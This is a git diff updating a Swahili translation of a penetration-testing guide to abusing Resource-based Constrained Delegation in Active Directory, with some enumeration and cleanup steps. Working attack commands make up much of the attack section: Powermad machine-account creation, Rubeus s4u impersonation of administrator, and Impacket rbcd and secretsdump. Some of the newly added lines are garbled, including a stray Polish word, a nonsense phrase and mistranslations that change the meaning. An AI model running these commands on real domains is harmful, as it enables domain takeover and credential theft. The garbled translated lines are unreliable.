@@ -5,42 +5,41 @@
 
 ## Misingi ya Resource-based Constrained Delegation
 
-Hii ni sawa na [Constrained Delegation](constrained-delegation.md) ya msingi lakini badala ya kutoa ruhusa kwa **object** ku **impersonate any user against a machine**, Resource-based Constrain Delegation **inaweka** ndani ya **object** ni nani anayeweza **impersonate any user against it**.
+Hii ni sawa na podstawowe [Constrained Delegation](constrained-delegation.md) lakini **badala** ya kumpatia ruhusa object ku**igiza** mtumiaji yeyote dhidi ya mashine. Resource-based Constrain Delegation **inaweka** ndani ya **object** ni nani anayeweza kuiga mtumiaji yeyote dhidi yake.
 
-Katika kesi hii, object iliyowekwa constraint itakuwa na attribute inaitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la mtumiaji anayeweza kuiga mtumiaji mwingine wowote dhidi yake.
+Katika kesi hii, object iliyowekwa constrained itakuwa na sifa iitwayo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la mtumiaji anayeweza kuiga mtumiaji mwingine yeyote dhidi yake.
 
-Tofauti nyingine muhimu kutoka kwa Constrained Delegation na delegations nyingine ni kwamba mtumiaji yeyote mwenye **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulitakiwa uwe na domain admin privs).
+Tofauti nyingine muhimu kutoka Constrained Delegation kwa delegations nyingine ni kwamba mtumiaji yeyote mwenye **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulihitaji ruhusa za domain admin).
 
-### New Concepts
+### Dhana mpya
 
-Nyuma katika Constrained Delegation ilisemwa kwamba flag ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kufanya **S4U2Self.** Lakini hiyo si sawa kabisa.\
-Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **service** (una SPN) lakini, ikiwa **una `TrustedToAuthForDelegation`** TGS iliyorejeshwa itakuwa **Forwardable** na ikiwa **huna** flag hiyo TGS iliyorejeshwa **haita** kuwa **Forwardable**.
+Katika Constrained Delegation ilisemwa kuwa bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kutekeleza **S4U2Self.** Lakini hiyo sio ukweli kamili. Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **service** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS inayorudishwa itakuwa **Forwardable** na ikiwa **huna** bendera hiyo TGS inayorudishwa **haitakuwa** **Forwardable**.
 
-Hata hivyo, ikiwa **TGS** inayotumika katika **S4U2Proxy** si **Forwardable** kujaribu kutumia **basic Constrain Delegation** haitafanya kazi. Lakini ikiwa unajaribu kuendeleza udhaifu wa **Resource-Based constrain delegation**, itafanya kazi.
+Hata hivyo, ikiwa **TGS** inayotumika katika **S4U2Proxy** si **Forwardable**, kujaribu kutumika kwa **basic Constrain Delegation** hautafanya kazi. Lakini ikiwa unajaribu kuchochea **Resource-Based constrain delegation**, itafanya kazi.
 
 ### Muundo wa shambulio
 
-> Kama una **write equivalent privileges** juu ya akaunti ya **Computer** unaweza kupata **privileged access** kwenye mashine hiyo.
+> Ikiwa una **write equivalent privileges** juu ya akaunti ya **Computer** unaweza kupata **ufikiaji wa ruhusa** kwenye mashine hiyo.
 
-Tukimaanisha mshambuliaji tayari ana **write equivalent privileges over the victim computer**.
+Tuseme mshambulizi tayari ana **write equivalent privileges over the victim computer**.
 
-1. Mshambuliaji anamtumikisha/ana **compromise** akaunti yenye **SPN** au **anaifanya mwenyewe** (“Service A”). Kumbuka kwamba **kila** _Admin User_ bila ruhusa nyingine maalum anaweza **create** hadi 10 Computer objects (**_MachineAccountQuota_**) na kuziweka SPN. Hivyo mshambuliaji anaweza tu kuunda Computer object na kuweka SPN.
-2. Mshambuliaji anatumia **abuses its WRITE privilege** juu ya kompyuta ya mwathirika (ServiceB) ili kusanidi **resource-based constrained delegation to allow ServiceA to impersonate any user** dhidi ya kompyuta ya mwathirika (ServiceB).
-3. Mshambuliaji anatumia Rubeus kufanya **full S4U attack** (S4U2Self and S4U2Proxy) kutoka Service A kwenda Service B kwa mtumiaji **with privileged access to Service B**.
-1. S4U2Self (kutoka kwenye akaunti iliyo compromise/created yenye SPN): Omba **TGS of Administrator to me** (Not Forwardable).
-2. S4U2Proxy: Tumia **not Forwardable TGS** ya hatua iliyotangulia kuomba **TGS** kutoka **Administrator** kwenda **victim host**.
-3. Hata kama unatumia not Forwardable TGS, kwa vile unachunguza Resource-based constrained delegation, itafanya kazi.
-4. Mshambuliaji anaweza **pass-the-ticket** na **impersonate** mtumiaji ili kupata **access to the victim ServiceB**.
+1. Mshambulizi anapata udhibiti wa akaunti ambayo ina **SPN** au **anaunda moja** (“Service A”). Kumbuka kuwa **mtumiaji yeyote wa Admin** bila ruhusa nyingine maalum anaweza **kuunda** hadi vitu 10 vya Computer (**_MachineAccountQuota_**) na kuweka SPN. Hivyo mshambulizi anaweza tu kuunda Computer object na kuweka SPN.
+2. Mshambulizi **anatumia vibaya idhini yake ya WRITE** juu ya kompyuta ya mwathiriwa (ServiceB) ili kusanidi **resource-based constrained delegation ili kumruhusu ServiceA kuiga mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathiriwa (ServiceB).
+3. Mshambulizi anatumia Rubeus kufanya **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B kwa mtumiaji **aliye na privileged access to Service B**.
+1. S4U2Self (kutoka kwa akaunti ya SPN iliyoharibiwa/iliyoundwa): Omba **TGS of Administrator to me** (Not Forwardable).
+2. S4U2Proxy: Tumia **not Forwardable TGS** ya hatua iliyotangulia kuomba **TGS** kutoka kwa **Administrator** hadi **victim host**.
+3. Hata kama unatumia TGS isiyo Forwardable, kwa kuwa unachochea Resource-based constrained delegation, itafanya kazi.
+4. Mshambulizi anaweza **pass-the-ticket** na **kuiga** mtumiaji kupata **ufikiaji wa victim ServiceB**.
 
-Ili kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
+Kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
 ```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
 ## Shambulio
 
-### Kuunda Objekti ya Kompyuta
+### Kuunda object ya kompyuta
 
-Unaweza kuunda objekti ya kompyuta ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**
+Unaweza kuunda object ya kompyuta ndani ya kikoa kwa kutumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**
 ```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -70,23 +69,24 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### Kutekeleza S4U attack kamili (Windows/Rubeus)
+### Kutekeleza kikamilifu S4U attack (Windows/Rubeus)
 
 Kwanza kabisa, tuliunda Computer object mpya na password `123456`, hivyo tunahitaji hash ya password hiyo:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-Hii itaonyesha RC4 na AES hashes za akaunti hiyo.\ Sasa, attack inaweza kufanywa:
+Hii itachapisha RC4 na AES hashes kwa akaunti hiyo.\
+Sasa, the attack inaweza kufanywa:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Unaweza kuzalisha tiketi za huduma zaidi kwa kuomba mara moja kwa kutumia param `/altservice` ya Rubeus:
+Unaweza kuunda tiketi zaidi kwa huduma zaidi kwa kuomba mara moja ukitumia `/altservice` param ya Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> Kumbuka kuwa watumiaji wana sifa iitwayo "**Cannot be delegated**". Ikiwa mtumiaji ana sifa hii ikawa True, hautaweza kujifanya mtumiaji huyo. Sifa hii inaonekana ndani ya bloodhound.
-
+> Kumbuka kuwa watumiaji wana sifa iitwayo "**Cannot be delegated**". Ikiwa mtumiaji ana sifa hii ikiwa True, hutaweza kujifanya yeye. Sifa hii inaweza kuonekana ndani ya bloodhound.
+ 
 ### Zana za Linux: RBCD kutoka mwanzo hadi mwisho na Impacket (2024+)
 
 Ikiwa unafanya kazi kutoka Linux, unaweza kutekeleza mnyororo kamili wa RBCD kwa kutumia zana rasmi za Impacket:
@@ -106,25 +106,25 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 # Example: dump local secrets via Kerberos (no NTLM)
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
-Vidokezo
-- Ikiwa LDAP signing/LDAPS imewekwa, tumia `impacket-rbcd -use-ldaps ...`.
-- Pendelea funguo za AES; domain nyingi za kisasa zinazuia RC4. Impacket na Rubeus zote zinaunga mkono mtiririko wa AES pekee.
-- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya zana, lakini upate SPN sahihi kadri inavyowezekana (kwa mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).
+Notes
+- Ikiwa LDAP signing/LDAPS imetekelezwa, tumia `impacket-rbcd -use-ldaps ...`.
+- Tendeuka kwa vijenzi vya AES; domain nyingi za kisasa zinazuia RC4. Impacket na Rubeus zote zinasaidia michakato ya AES-tu.
+- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya zana, lakini pata SPN sahihi inapowezekana (mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
-### Kufikia
+### Kupata Ufikiaji
 
-Mstari wa amri wa mwisho utatekeleza **shambulio kamili la S4U na utaingiza TGS** kutoka kwa Administrator kwenye mwenyeji wa mwathirika katika **kumbukumbu**.\
-Katika mfano huu ilihitajika TGS kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
+Amri ya mwisho itafanya **shambulio kamili la S4U na itaingiza TGS** kutoka kwa Administrator hadi kwenye mwenyeji wa mhusika ndani ya **kumbukumbu**.\
+Katika mfano huu ilitoa ombi la TGS kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
-### Kutumia vibaya tiketi mbalimbali za huduma
+### Tumia vibaya tikiti mbalimbali za huduma
 
-Jifunze kuhusu the [**available service tickets here**](silver-ticket.md#available-services).
+Jifunze kuhusu [**available service tickets here**](silver-ticket.md#available-services).
 
-## Kukusanya, kukagua na kusafisha
+## Kuorodhesha, ukaguzi na usafishaji
 
-### Orodhesha kompyuta zilizo na RBCD imewekwa
+### Kuorodhesha kompyuta zilizo na RBCD iliyosanidiwa
 
 PowerShell (kufasiri SD ili kutatua SIDs):
 ```powershell
@@ -142,12 +142,12 @@ try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $n
 }
 }
 ```
-Impacket (soma au safisha kwa amri moja):
+Impacket (read au flush kwa amri moja):
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
 ```
-### Usafishaji / kuanzisha upya RBCD
+### Usafishaji / kuweka upya RBCD
 
 - PowerShell (futa sifa):
 ```powershell
@@ -164,42 +164,42 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 ```
 ## Makosa ya Kerberos
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii ina maana Kerberos imewekwa ili isitumie DES au RC4 na wewe unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa rc4, aes128 na aes256 hashes). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KRB_AP_ERR_SKEW`**: Hii ina maana saa ya kompyuta ya sasa ni tofauti na ile ya DC na Kerberos haifanyi kazi ipasavyo.
-- **`preauth_failed`**: Hii ina maana jina la mtumiaji + hashes ulizotoa hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji wakati wa kuunda hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii ina maana kwamba Kerberos imewekwa kuto kutumia DES au RC4 na unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa tu rc4, aes128 na aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KRB_AP_ERR_SKEW`**: Hii ina maana kwamba saa ya kompyuta ya sasa ni tofauti na ile ya DC na Kerberos haifanyi kazi vizuri.
+- **`preauth_failed`**: Hii ina maana kwamba username + hashes zilizotolewa hazifanyi kazi kuingia. Huenda umeisahau kuweka "$" ndani ya username wakati wa kuzalisha hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
-  - Mtumiaji unayejaribu kuiga hawezi kupata huduma inayotakiwa (kwa sababu huwezi kuiga au kwa sababu hana vibali vya kutosha)
-  - Huduma uliyoomba haipo (ikiwa unaomba tiketi kwa winrm lakini winrm haifanyi kazi)
-  - fakecomputer iliyoundwa imepoteza vibali vyake juu ya server iliyo hatarini na unahitaji kuirudishia
-  - Unatumia KCD ya kawaida; kumbuka RBCD inafanya kazi na tiketi za S4U2Self zisizoweza kuhamishwa (non-forwardable), wakati KCD inahitaji forwardable.
+- User unayejaribu kuigiza hawezi kufikia service inayotakiwa (kwa sababu hauwezi kuigiza au kwa sababu haina ruhusa za kutosha)
+- Service uliyoomba haipo (kama unaomba tiketi ya winrm lakini winrm haikuwashwa)
+- fakecomputer ulioundwa ameisha kupata ruhusa zake juu ya server iliyo na udhaifu na unahitaji kuzirudisha.
+- Unavunja KCD ya kawaida; kumbuka RBCD inafanya kazi na tiketi za S4U2Self zisizoweza kupelekwa (non-forwardable), wakati KCD inahitaji forwardable.
 
-## Vidokezo, relay na mbadala
+## Vidokezo, relays na mbadala
 
-- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Angalia:
+- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. See:
 
 
 {{#ref}}
 adws-enumeration.md
 {{#endref}}
 
-- Minyororo ya Kerberos relay mara nyingi hufikia mwisho kwa RBCD ili kupata SYSTEM ya mlocal kwa hatua moja. Tazama mifano ya vitendo kutoka mwanzo hadi mwisho:
+- Kerberos relay chains mara nyingi zinaisha kwa RBCD ili kupata local SYSTEM kwa hatua moja. See practical end-to-end examples:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-- Ikiwa LDAP signing/channel binding vimezimwa na unaweza kuunda akaunti ya mashine, zana kama **KrbRelayUp** zinaweza kurelay uthibitisho wa Kerberos ulioshinikizwa kwa LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa akaunti yako ya mashine kwenye object ya kompyuta lengwa, na mara moja kuiga **Administrator** kupitia S4U kutoka off-host.
+- Ikiwa LDAP signing/channel binding imezimwa na unaweza kuunda machine account, zana kama **KrbRelayUp** zinaweza kurelay auth iliyelikwa ya Kerberos hadi LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa machine account yako kwenye target computer object, na mara moja kuigiza **Administrator** kupitia S4U kutoka off-host.
 
-## Marejeo
+## Marejeleo
 
 - [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
-- Impacket rbcd.py (rasmi): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
-- Cheatsheet fupi ya Linux yenye sintaksia ya hivi karibuni: https://tldrbins.github.io/rbcd/
+- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
+- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
 - [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 
